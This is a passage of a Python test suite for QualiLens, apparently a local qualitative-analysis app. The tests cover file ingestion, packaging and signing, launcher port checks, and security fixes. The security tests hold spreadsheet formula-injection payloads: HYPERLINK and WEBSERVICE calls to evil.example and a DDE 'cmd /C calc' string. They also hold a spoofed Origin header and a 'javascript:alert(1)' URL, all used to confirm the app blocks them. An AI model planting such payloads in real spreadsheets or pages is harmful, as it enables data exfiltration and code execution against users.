        assert len(user) < common.FAMILIARIZE_CHARS + 500
        return (json.dumps({"summary": "s", "memo": "m"}), {"input_tokens": 1, "output_tokens": 1, "stop_reason": "end_turn"})
    monkeypatch.setattr(llm, "chat", fake)
    common.stage_familiarize(ctx)
    n = db.get_conn().execute("SELECT COUNT(*) c FROM events WHERE run_id=? AND message LIKE 'Familiarization read the first%'",
                              (ctx.run_id,)).fetchone()["c"]
    assert n == 1


# ====================================================================
# B24: ingestion
# ====================================================================

def test_decoding_never_guesses_utf16_without_bom(tmp_path):
    raw = "Café au lait, résumé!".encode("cp1252")
    if len(raw) % 2:
        raw += b" "
    assert ingestion.decode_text(raw) == raw.decode("cp1252")
    assert ingestion.decode_text("héllo".encode("utf-8")) == "héllo"
    assert ingestion.decode_text(b"\xef\xbb\xbfhi") == "hi"
    assert ingestion.decode_text("wide".encode("utf-16")) == "wide"       # BOM present
    assert ingestion.decode_text(b"\xff\xfe" + "wide".encode("utf-16-le")) == "wide"
    with pytest.raises(ValueError, match="RTF"):
        ingestion.classify("note.rtf")
    assert ingestion.classify("x.markdown") == "text"


def test_docx_text_in_document_order_with_tables_and_textboxes(tmp_path):
    import docx as _docx
    d = _docx.Document()
    d.add_paragraph("First paragraph.")
    t = d.add_table(rows=1, cols=2)
    t.rows[0].cells[0].text = "Speaker"
    t.rows[0].cells[1].text = "Hello there"
    d.add_paragraph("After the table.")
    p = tmp_path / "t.docx"
    d.save(p)
    text = ingestion.extract_text_with_pages(p)[0]
    assert text.index("First paragraph.") < text.index("Speaker | Hello there") < text.index("After the table.")


def test_upload_without_filename_is_400():
    r = client.post('/api/projects', json={"name": "N", "method": "thematic",
                                           "config": {"provider": "anthropic", "research_question": "q"}})
    pid = r.json()["id"]
    r = client.post(f'/api/projects/{pid}/sources',
                    files={"file": ("", io.BytesIO(b"text"), "text/plain")}, data={"grp": ""})
    assert r.status_code in (400, 422)


# ====================================================================
# C1: packaging freshness and signing through package.sh
# ====================================================================

def test_package_sh_signs_and_ships_a_fresh_build(tmp_path):
    root = pathlib.Path(__file__).resolve().parent.parent.parent
    key = tmp_path / "test.key"
    pub = signing.keygen(key)
    env = dict(os.environ, QUALILENS_SIGNING_KEY=str(key), QUALILENS_PYTHON=sys.executable)
    # (package.sh re-stamps VERSION in the tree; conftest restores it after every test)
    r = subprocess.run(["bash", str(root / "package.sh"), str(tmp_path / "b.zip")],
                       cwd=tmp_path, capture_output=True, text=True, env=env)
    assert r.returncode == 0, r.stderr
    assert "Signed (verify" in r.stdout
    assert signing.verify_bundle_file(tmp_path / "b.zip", pub) > 50
    with zipfile.ZipFile(tmp_path / "b.zip") as z:
        names = z.namelist()
        assert "QualiLens/MANIFEST.sig" in names
        assert not any(n.endswith(".bak") for n in names)
        gi = z.read("QualiLens/.gitignore").decode()
        assert "FINGERPRINT" not in gi and "Private files" not in gi
        # the shipped interface was built from the shipped sources
        from app.buildinfo import frontend_source_fingerprint
        stage = tmp_path / "unz"
        z.extractall(stage)
        built = z.read("QualiLens/frontend/dist/index.html").decode()
        import re as _re
        m = _re.search(r'<meta name="ql-src" content="([0-9a-f]+)"', built)
        assert m, "dist/index.html must carry the source fingerprint"
        assert m.group(1) == frontend_source_fingerprint(stage / "QualiLens" / "frontend")


# ====================================================================
# Launcher: a server remembers the build it started with, and run.sh names
# whoever holds the port (2026-09-02: a pre-audit server left running in a
# forgotten Terminal tab kept serving old code for days after the fixes
# landed in the folder — run.sh only said "is QualiLens already running?").
# ====================================================================

def test_index_and_meta_carry_the_running_build():
    from app import main as main_mod
    assert main_mod.STARTED_BUILD and main_mod.STARTED_BUILD != "unknown"
    assert client.get("/api/meta").json()["running_build"] == main_mod.STARTED_BUILD
    if not main_mod.FRONTEND_DIST.exists():
        pytest.skip("no built frontend beside the backend")
    r = stranger.get("/")          # no token needed: run.sh reads this page
    assert f'<meta name="ql-build" content="{main_mod.STARTED_BUILD}">' in r.text


_STANDIN = r"""
import sys, http.server, socketserver
body = sys.argv[4].encode()
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type", "text/html")
        self.end_headers(); self.wfile.write(body)
    def log_message(self, *a): pass
socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("127.0.0.1", int(sys.argv[1])), H) as s:
    s.serve_forever()
"""


def _standin_server(port, html):
    """A tiny HTTP server whose command line reads '… uvicorn app.main:app …'
    the way the real launch does, so run.sh's holder detection sees it. Never
    the real app: nothing here touches the database."""
    import shutil, socket, time
    p = subprocess.Popen([sys.executable, "-c", _STANDIN, str(port), "uvicorn", "app.main:app", html],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(100):
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.2):
                return p
        except OSError:
            time.sleep(0.05)
    p.kill()
    raise RuntimeError("stand-in server did not start")


@pytest.mark.parametrize("stamp, expect, absent", [
    ("__here__", "That is this folder's build", "stop it and run ./run.sh again"),
    ("2026.01.01-0000", "running build 2026.01.01-0000", "That is this folder's build"),
    (None, "predates build stamps", "That is this folder's build"),
])
def test_run_sh_names_the_process_holding_the_port(stamp, expect, absent):
    import shutil, socket
    if not (shutil.which("lsof") and shutil.which("curl")):
        pytest.skip("run.sh's port report needs lsof and curl")
    root = pathlib.Path(__file__).resolve().parent.parent.parent
    here = (root / "VERSION").read_text().strip()
    if stamp == "__here__":
        stamp = here
    html = "<html><head>" + (f'<meta name="ql-build" content="{stamp}">' if stamp else "") + "</head></html>"
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0)); port = s.getsockname()[1]
    p = _standin_server(port, html)
    try:
        r = subprocess.run(["bash", str(root / "run.sh")], cwd=root, capture_output=True, text=True,
                           env=dict(os.environ, QUALILENS_PORT=str(port)), timeout=60)
    finally:
        p.kill(); p.wait()
    assert r.returncode == 1, r.stderr
    assert f"Port {port} is already in use." in r.stderr
    assert expect in r.stderr, r.stderr
    assert absent not in r.stderr, r.stderr
    assert f"kill {p.pid}" in r.stderr, r.stderr
    assert f"process {p.pid}" in r.stderr
    assert "QualiLens running at" not in r.stdout    # it never tried to launch


def test_run_sh_names_a_foreign_process_holding_the_port():
    import shutil, socket, time
    if not shutil.which("lsof"):
        pytest.skip("run.sh's port report needs lsof")
    root = pathlib.Path(__file__).resolve().parent.parent.parent
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0)); port = s.getsockname()[1]
    p = subprocess.Popen([sys.executable, "-c",
                          f"import socketserver,http.server; socketserver.TCPServer.allow_reuse_address=True; "
                          f"socketserver.TCPServer(('127.0.0.1',{port}), http.server.BaseHTTPRequestHandler).serve_forever()"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        for _ in range(100):
            try:
                with socket.create_connection(("127.0.0.1", port), timeout=0.2):
                    break
            except OSError:
                time.sleep(0.05)
        r = subprocess.run(["bash", str(root / "run.sh")], cwd=root, capture_output=True, text=True,
                           env=dict(os.environ, QUALILENS_PORT=str(port)), timeout=60)
    finally:
        p.kill(); p.wait()
    assert r.returncode == 1
    assert "Another program holds it" in r.stderr and f"process {p.pid}" in r.stderr
    assert "QUALILENS_PORT" in r.stderr


def test_frontend_fingerprint_matches_between_python_and_build():
    root = pathlib.Path(__file__).resolve().parent.parent.parent
    idx = root / "frontend" / "dist" / "index.html"
    if not idx.exists():
        pytest.skip("no built frontend")
    import re as _re
    from app.buildinfo import frontend_source_fingerprint
    m = _re.search(r'<meta name="ql-src" content="([0-9a-f]+)"', idx.read_text())
    assert m and m.group(1) == frontend_source_fingerprint(root / "frontend"), \
        "frontend/dist is stale — run npm run build (or ./package.sh)"


# ====================================================================
# A4: data dir and sync hint
# ====================================================================

def test_synced_folder_hint():
    assert db.synced_folder_hint(pathlib.Path("/Users/x/Dropbox/Projects/app/data")) == "dropbox"
    assert db.synced_folder_hint(pathlib.Path("/home/x/Library/Mobile Documents/com~apple~CloudDocs/a")) == "mobile documents"
    assert db.synced_folder_hint(pathlib.Path("/srv/plain/data")) == ""
    r = client.get("/api/meta").json()
    assert "data_dir" in r and "synced_folder" in r


def test_source_cited_by_completed_run_needs_force(mock_llm_ca):
    pid, run_id = mock_llm_ca
    d = _wait(run_id, "awaiting_review")
    client.post(f'/api/runs/{run_id}/checkpoints/{d["pending_checkpoint"]["id"]}/resolve', json={"decisions": []})
    _wait(run_id, "completed")
    sid = client.get(f'/api/projects/{pid}').json()["sources"][0]["id"]
    assert client.delete(f'/api/sources/{sid}').status_code == 409
    assert client.delete(f'/api/sources/{sid}?force=true').status_code == 200


# ====================================================================
# 2026-09-03 audit: sheet cells, exact origin, upload bound, rollback, release link
# ====================================================================

def test_sheet_cells_are_text_never_formulas():
    """openpyxl stores a string beginning with '=' as a formula; names,
    definitions, and quotes come from the model and from the documents."""
    from openpyxl import load_workbook
    from app import checkpoint_sheets as cs
    evil = '=HYPERLINK("http://evil.example/?x","open")'
    payload = {"kind": "code_review", "stage": "open_code",
               "items": [{"id": "c1", "name": evil, "definition": "=1+1", "excerpt_count": 1,
                          "sample_excerpts": [{"quote": '=WEBSERVICE("http://evil.example")'}]}]}
    meta = {"project_name": "=cmd|' /C calc'!A0", "run_id": "r", "checkpoint_id": "cp1",
            "title": "t", "stage": "open_code", "exported_at": "now"}
    data = cs.export_workbook("code_review", payload, meta,
                              excerpts=[{"code_id": "c1", "code": evil, "via": "", "source": "s",
                                         "quote": "=SUM(A1)", "memo": ""}])
    wb = load_workbook(io.BytesIO(data))
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for c in row:
                assert c.data_type != "f", f"{ws.title}!{c.coordinate} became a formula: {c.value!r}"
    assert wb["Codes"]["B2"].value == evil
    # and it reads back as the same, unchanged, code
    parsed = cs.parse_workbook("code_review", payload, data, "cp1")
    assert parsed["summary"]["renamed"] == 0 and parsed["summary"]["unchanged"] == 1
    # the extraction sheet takes the same path
    payload2 = {"kind": "extraction_review", "fields": ["aims"], "field_labels": {"aims": "Aims"},
                "rows": [{"source_id": "s1", "filename": "=f.pdf", "label": "=L", "citation": "",
                          "fields": {"aims": "=A"}, "cited_work": ""}]}
    wb2 = load_workbook(io.BytesIO(cs.export_workbook("extraction_review", payload2, meta,
                                                       excerpts=[{"source_id": "s1", "paper": "=L", "field": "aims",
                                                                  "quote": "=Q", "memo": ""}])))
    assert all(c.data_type != "f" for ws in wb2.worksheets for row in ws.iter_rows() for c in row)


def test_origin_must_be_the_apps_own_origin_exactly():
    """Browsers ignore the port for cookies and for SameSite, so a page served
    by another local program on another port arrives WITH the cookie; only
    an Origin equal to this app's own (scheme, host, port) may pass."""
    from app import main as main_mod
    cookie_only = TestClient(app, base_url="http://127.0.0.1")
    cookie_only.cookies.set(main_mod.TOKEN_COOKIE, SESSION_TOKEN)
    host = {"Host": "127.0.0.1:8765"}
    for origin in ("http://127.0.0.1:3000", "http://localhost:3000", "http://localhost:8765",
                   "https://127.0.0.1:8765", "http://127.0.0.1", "null", "http://127.0.0.1:8765.evil.example"):
        r = cookie_only.get("/api/meta", headers={**host, "Origin": origin})
        assert r.status_code == 403, origin
    assert cookie_only.get("/api/meta", headers={**host, "Origin": "http://127.0.0.1:8765"}).status_code == 200
    assert cookie_only.get("/api/meta", headers={"Host": "localhost:8765", "Origin": "http://localhost:8765"}).status_code == 200
    assert cookie_only.get("/api/meta", headers={"Host": "[::1]:8765", "Origin": "http://[::1]:8765"}).status_code == 200
    assert cookie_only.get("/api/meta", headers={"Host": "127.0.0.1:8765", "Origin": "HTTP://127.0.0.1:8765"}).status_code == 200
    # no Origin at all (a plain download link) is still gated by the token alone
    assert cookie_only.get("/api/meta", headers=host).status_code == 200
    assert TestClient(app, base_url="http://127.0.0.1").get("/api/meta", headers=host).status_code == 401


def test_source_upload_is_bounded_and_streamed(monkeypatch):
    from app import main as main_mod
    monkeypatch.setitem(main_mod.MAX_SOURCE_BYTES, "text", 64)
    r = client.post('/api/projects', json={"name": "Bound", "method": "thematic",
                                           "config": {"provider": "anthropic", "research_question": "q"}})
    pid = r.json()["id"]
    r = client.post(f"/api/projects/{pid}/sources",
                    files={"file": ("big.txt", io.BytesIO(b"x" * 1000), "text/plain")}, data={"grp": ""})
    assert r.status_code == 413 and "larger than" in r.json()["detail"]
    assert not list(db.UPLOADS_DIR.glob("*_big.txt")), "a refused upload must not linger on disk"
    assert client.get(f"/api/projects/{pid}").json()["sources"] == []
    r = client.post(f"/api/projects/{pid}/sources",
                    files={"file": ("small.txt", io.BytesIO(b"short text"), "text/plain")}, data={"grp": ""})
    assert r.status_code == 200 and r.json()["meta"]["bytes"] == 10
    assert main_mod.MAX_SOURCE_BYTES["video"] > main_mod.MAX_SOURCE_BYTES["audio"] > main_mod.MAX_SOURCE_BYTES["text"]


def test_update_refuses_an_older_build_unless_asked(tmp_path, monkeypatch):
    from tests.test_fixes import _make_bundle, _fake_app_root, _quiesce_runs
    root = _fake_app_root(tmp_path, monkeypatch)          # installed build 1111.01.01
    older = _make_bundle(tmp_path, version="1000.01.01")
    with pytest.raises(update.RollbackRefused, match="older than the installed build"):
        update.apply_update(older)
    assert (root / "VERSION").read_text() == "1111.01.01"
    assert (root / "backend" / "app" / "main.py").read_text() == "# old main", "nothing may change before the refusal"
    _quiesce_runs()
    # the zip endpoint answers 409 …
    with open(older, "rb") as f:
        r = client.post('/api/settings/update', files={"file": ("QualiLens.zip", f, "application/zip")})
    assert r.status_code == 409 and "older" in r.json()["detail"]
    # … the GitHub path never installs an older build …
    monkeypatch.setattr(update, "download_latest_bundle", lambda d: older)
    assert client.post('/api/settings/install_update').status_code == 409
    assert (root / "VERSION").read_text() == "1111.01.01"
    # … and the zip path installs it only when told to
    with open(older, "rb") as f:
        r = client.post('/api/settings/update', files={"file": ("QualiLens.zip", f, "application/zip")},
                        data={"allow_downgrade": "true"})
    assert r.status_code == 200 and r.json()["to_version"] == "1000.01.01"
    assert (root / "VERSION").read_text() == "1000.01.01"
    # the same build again (a repair) and an unstamped build are not rollbacks
    assert update.apply_update(_make_bundle(tmp_path, version="1000.01.01"))["ok"]
    assert update.apply_update(_make_bundle(tmp_path, version="unknown"))["ok"]
    assert update.is_older_build("2026.09.02-1845", "2026.09.03-0900")
    assert not update.is_older_build("2026.09.03-0900", "2026.09.02-1845")
    assert not update.is_older_build("dev", "2026.09.02-1845")


def test_release_page_link_only_when_it_is_github(monkeypatch):
    base = {"tag_name": "v9", "name": "v9 — build 9999.01.01-0000", "body": "", "assets": []}
    monkeypatch.setattr(update, "fetch_latest_release", lambda: {**base, "html_url": "javascript:alert(1)"})
    r = client.post('/api/settings/check_updates').json()
    assert r["ok"] and r["newer"] is True and r["release_url"] == ""
    monkeypatch.setattr(update, "fetch_latest_release", lambda: {**base, "html_url": "https://evil.example/qualilens"})
    assert client.post('/api/settings/check_updates').json()["release_url"] == ""
    good = f"https://github.com/{update.UPDATE_REPO}/releases/tag/v9"
    monkeypatch.setattr(update, "fetch_latest_release", lambda: {**base, "html_url": good})
    assert client.post('/api/settings/check_updates').json()["release_url"] == good


def test_release_version_is_exposed_and_carried_by_updates(tmp_path, monkeypatch):
    """The version a user sees ('1.6.3') comes from RELEASE beside VERSION:
    read by the server, stamped into the page, named by the update check,
    and replaced by an update like the build stamp is."""
    from tests.test_fixes import _make_bundle, _fake_app_root
    from app import main as main_mod
    root = _fake_app_root(tmp_path, monkeypatch)
    assert update._current_release() == "unknown"         # a checkout without the file
    # the stamp inside dist/index.html serves an installed copy whose updater
    # refused the RELEASE file (an allowlist older than 1.7.0)
    (root / "frontend" / "dist" / "index.html").write_text(
        '<html><head><meta name="ql-release-stamp" content="1.7.0"></head></html>')
    assert update._current_release() == "1.7.0"
    (root / "RELEASE").write_text("1.6.3\n")
    assert update._current_release() == "1.6.3"          # the file wins when present
    assert update._is_allowed("RELEASE")
    r = update.apply_update(_make_bundle(tmp_path, extra={"QualiLens/RELEASE": "9.9.9"}))
    assert r["ok"] and (root / "RELEASE").read_text() == "9.9.9"
    m = client.get("/api/meta").json()
    assert m["release"] == "9.9.9" and "running_release" in m
    if main_mod.FRONTEND_DIST.exists():
        assert '<meta name="ql-release" content="' in stranger.get("/").text
    base = {"tag_name": "v9", "name": "v9 — build 9999.01.01-0000", "body": "", "assets": [], "html_url": ""}
    monkeypatch.setattr(update, "fetch_latest_release", lambda: base)
    assert client.post('/api/settings/check_updates').json()["release"] == "9.9.9"


def test_update_reminder_thresholds_and_launch_dismissal(monkeypatch):
    """A build 30+ days old with no check in 14 days earns the note; a check
    silences it; Dismiss silences it for this launch. No network anywhere."""
    import time as _time
    from app import main as main_mod
    now = _time.mktime((2026, 9, 3, 12, 0, 0, 0, 0, -1))
    fresh, old = "2026.09.01-0900", "2026.07.01-0900"
    assert update.update_reminder(fresh, None, now) == {"build_age_days": 2, "days_since_check": None, "remind": False}
    r = update.update_reminder(old, None, now)
    assert r["remind"] is True and r["build_age_days"] == 64
    assert update.update_reminder(old, now - 3 * 86400, now)["remind"] is False
    assert update.update_reminder(old, now - 20 * 86400, now)["remind"] is True
    assert update.update_reminder("unknown", None, now) == {"build_age_days": None, "days_since_check": None, "remind": False}
    assert update.update_reminder("2026.07.01", None, now)["remind"] is True     # date-only stamps count too
    # the API, with an old running build and no check recorded
    monkeypatch.setattr(main_mod, "STARTED_BUILD", old)
    monkeypatch.setattr(main_mod, "_hint_dismissed", False)
    db.set_setting(main_mod.LAST_CHECK_KEY, "")
    h = client.get("/api/meta").json()["update_hint"]
    assert h["remind"] is True and h["dismissed"] is False and h["last_checked"] is None
    # pressing Check for updates records the time and silences the note
    base = {"tag_name": "v9", "name": "v9 — build 9999.01.01-0000", "body": "", "assets": [], "html_url": ""}
    monkeypatch.setattr(update, "fetch_latest_release", lambda: base)
    assert client.post("/api/settings/check_updates").json()["ok"]
    assert float(db.get_setting(main_mod.LAST_CHECK_KEY)) > 0
    h = client.get("/api/meta").json()["update_hint"]
    assert h["remind"] is False and h["days_since_check"] == 0
    # a failed check records nothing
    db.set_setting(main_mod.LAST_CHECK_KEY, "")
    monkeypatch.setattr(update, "fetch_latest_release", lambda: (_ for _ in ()).throw(update.UpdateError("offline")))
    assert client.post("/api/settings/check_updates").json()["ok"] is False
    assert db.get_setting(main_mod.LAST_CHECK_KEY) == ""
    # Dismiss hides it for this launch only (the flag lives in the process)
    assert client.post("/api/settings/dismiss_update_hint").json()["ok"]
    h = client.get("/api/meta").json()["update_hint"]
    assert h["remind"] is True and h["dismissed"] is True
    assert TestClient(app, base_url="http://127.0.0.1").post("/api/settings/dismiss_update_hint").status_code == 401
